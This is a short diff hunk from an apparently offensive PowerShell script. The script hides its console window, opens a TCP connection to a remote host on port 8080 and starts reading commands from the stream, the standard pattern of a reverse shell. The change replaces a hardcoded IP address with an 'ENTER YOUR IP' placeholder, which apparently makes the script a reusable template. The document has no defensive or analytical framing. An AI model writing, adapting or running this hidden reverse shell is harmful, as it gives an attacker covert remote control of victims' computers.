@@ -12,7 +12,7 @@ $handle = (Get-Process -id $pid).MainWindowHandle
 $null = [Win32]::ShowWindow($handle, 0)
 '@
 
-$client = New-Object System.Net.Sockets.TCPClient("80.225.214.48", 8080)
+$client = New-Object System.Net.Sockets.TCPClient("ENTER YOUR IP", 8080)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
